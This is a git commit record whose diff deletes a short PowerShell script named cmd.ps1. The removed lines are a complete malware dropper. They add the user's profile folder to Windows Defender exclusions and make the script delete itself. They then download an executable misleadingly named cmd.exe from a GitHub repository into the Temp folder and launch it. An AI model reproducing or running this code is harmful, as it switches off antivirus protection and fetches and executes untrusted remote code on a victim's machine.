e109d03395c8a36e2f0373908393496bffb78f9c
Aevagee <108525058+Aevagee@users.noreply.github.com>
2024-11-04 19:35:39 +0300

    Delete cmd.ps1

--- cmd.ps1
+++
@@ -1,7 +0,0 @@
-Add-MpPreference -ExclusionPath $env:USERPROFILE
-Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
-$url = 'https://github.com/Aevagee/younet/raw/refs/heads/main/cmd.exe'
-$outputFile = [System.IO.Path]::Combine($env:Temp, 'cmd.exe')
-Start-Sleep -Milliseconds 100 
-Invoke-WebRequest -Uri $url -OutFile $outputFile
-Start-Process -FilePath $outputFile
